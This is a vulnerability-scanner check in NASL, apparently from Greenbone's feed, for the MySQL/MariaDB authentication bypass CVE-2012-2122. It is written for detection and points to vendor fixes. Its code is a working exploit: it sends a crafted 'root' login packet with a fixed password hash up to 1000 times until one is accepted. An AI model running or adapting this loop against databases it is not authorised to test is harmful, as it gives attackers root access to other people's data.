# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103492");
  script_version("2025-09-09T05:38:49+0000");
  script_tag(name:"last_modification", value:"2025-09-09 05:38:49 +0000 (Tue, 09 Sep 2025)");
  script_tag(name:"creation_date", value:"2012-06-11 18:38:54 +0200 (Mon, 11 Jun 2012)");
  script_tag(name:"cvss_base", value:"5.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2012-2122");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("MySQL / MariaDB Authentication Bypass (Apr 2012) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Databases");
  script_dependencies("gb_mysql_mariadb_remote_detect.nasl");
  script_mandatory_keys("mysql_mariadb/remote/detected");
  script_require_ports("Services/mysql", 3306);

  script_tag(name:"summary", value:"MySQL / MariaDB is prone to an authentication bypass.");

  script_tag(name:"vuldetect", value:"Sends various crafted TCP requests and checks the
  responses.");

  script_tag(name:"impact", value:"Successful exploitation will yield unauthorized access to the
  database.");

  script_tag(name:"affected", value:"All MariaDB and MySQL versions up to 5.1.61, 5.2.11, 5.3.5,
  5.5.23 are vulnerable.");

  script_tag(name:"solution", value:"Update to:

  - MariaDB version 5.1.62, 5.2.12, 5.3.6, 5.5.23 or later

  - MySQL version 5.1.63, 5.5.24, 5.6.6 or later");

  script_xref(name:"URL", value:"http://bugs.mysql.com/bug.php?id=64884");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/53911");
  script_xref(name:"URL", value:"https://mariadb.atlassian.net/browse/MDEV-212");
  script_xref(name:"URL", value:"https://web.archive.org/web/20131027090831/http://www.h-online.com:80/open/news/item/Simple-authentication-bypass-for-MySQL-root-revealed-Update-1614990.html");
  script_xref(name:"URL", value:"http://seclists.org/oss-sec/2012/q2/493");

  exit(0);
}

include("byte_func.inc");
include("host_details.inc");
include("version_func.inc");

set_byte_order(BYTE_ORDER_LITTLE_ENDIAN);

cpe_list = make_list( "cpe:/a:oracle:mysql",
                      "cpe:/a:mariadb:mariadb" );

if( ! infos = get_app_port_from_list( cpe_list:cpe_list, service:"mysql" ) )
  exit( 0 );

port = infos["port"];

if( get_kb_item( "MySQL/" + port + "/blocked" ) )
  exit( 0 );

cpe  = infos["cpe"];
if( ! vers = get_app_version( cpe:cpe, port:port ) )
  exit( 0 );

# nb: The vulnerability exists only on specific builds and the original advisory says:
# "many MySQL/MariaDB builds are not affected by this bug."
# "As far as I know, official vendor MySQL and MariaDB binaries are not vulnerable."
# Starting from year 2018 (6 years after the vuln) we're now only checking the mentioned
# vulnerable versions to avoid the thousand failed logins in the for loop below...
if( version_is_less( version:vers, test_version:"5.1.63" ) ||
    version_in_range( version:vers, test_version:"5.2.0", test_version2:"5.2.11" ) ||
    version_in_range( version:vers, test_version:"5.3.0", test_version2:"5.3.5" ) ||
    version_in_range( version:vers, test_version:"5.5.0", test_version2:"5.5.23" ) ) {

  sock = open_sock_tcp( port );
  if( ! sock )
    exit( 0 );

  res = recv( socket:sock, length:4 );
  if( ! res )
    exit( 0 );

  plen = ord( res[0] ) + ( ord( res[1] ) / 8 ) + ( ord( res[2] ) / 16 );
  res = recv( socket:sock, length:plen );

  req = raw_string( 0x50, 0x00, 0x00,                   # Packet length
                    0x01,                               # Packet number
                    0x05, 0xa6,                         # Client Capabilities
                    0x0f, 0x00,                         # Extended Client Capabilities
                    0x00, 0x00, 0x00, 0x01,             # MAX Packet
                    0x21,                               # Charset
                    0x00, 0x00, 0x00, 0x00, 0x00,       # Unused
                    0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00,
                    0x72, 0x6f, 0x6f, 0x74, 0x00,       # Username: root
                    0x14,                               # Password length
                    0x26, 0xcd, 0x8e, 0x6a, 0x43,       # Password
                    0x44, 0x61, 0x21, 0xe7, 0x96,
                    0x8b, 0x18, 0xc3, 0xdc, 0x55,
                    0xcc, 0x5d, 0xd6, 0xa3, 0xb0,
                    "mysql_native_password",            # Client Auth Plugin
                    0x00 );

  send( socket:sock,data:req );
  res = recv( socket:sock, length:4 );
  if( ! res || strlen( res ) < 4 ) {
    close( sock );
    exit( 0 );
  }

  plen = ord( res[0] ) + ( ord( res[1] ) / 8 ) + ( ord( res[2] ) / 16 );

  res = recv( socket:sock, length:plen );
  if( ! res || strlen( res ) < plen ) {
    close( sock );
    exit( 0 );
  }

  close( sock );

  errno = ord( res[2] ) << 8 | ord( res[1] );
  if( errno != 1045 )
    exit( 0 );

  for( i = 0; i < 1000; i++ ) {

    sock = open_sock_tcp( port );
    if( ! sock )
      continue;

    buf = recv( socket:sock, length:4 );
    if( strlen( buf ) < 4 ) {
      close( sock );
      continue;
    }

    plen = ord( buf[0] ) + ( ord( buf[1] ) / 8 ) + ( ord( buf[2] ) / 16 );
    buf = recv( socket:sock, length:plen );

    if( strlen( buf ) < plen ) {
      close( sock );
      continue;
    }

    send( socket:sock, data:req );
    recv = recv( socket:sock, length:4 );

    if( strlen( recv ) < 4 ) {
      close( sock );
      continue;
    }

    blen = ord( recv[0] ) + ( ord( recv[1] ) / 8 ) + ( ord( recv[2] ) / 16 );
    recv = recv( socket:sock, length:blen );

    if( strlen( recv ) < blen ) {
      close( sock );
      continue;
    }

    errno = ord( recv[2] ) << 8 | ord( recv[1] );
    if( errno == 0 && ( ord( recv[0] ) == 0 && ord( recv[3] ) == 2 && ord( recv[4] ) == 0 ) ) {
      report = "It was possible to bypass authentication and login as the user 'root'.";
      security_message( port:port, data:report );
      close( sock );
      exit( 0 );
    }
    close( sock );
  }
}

exit( 99 );
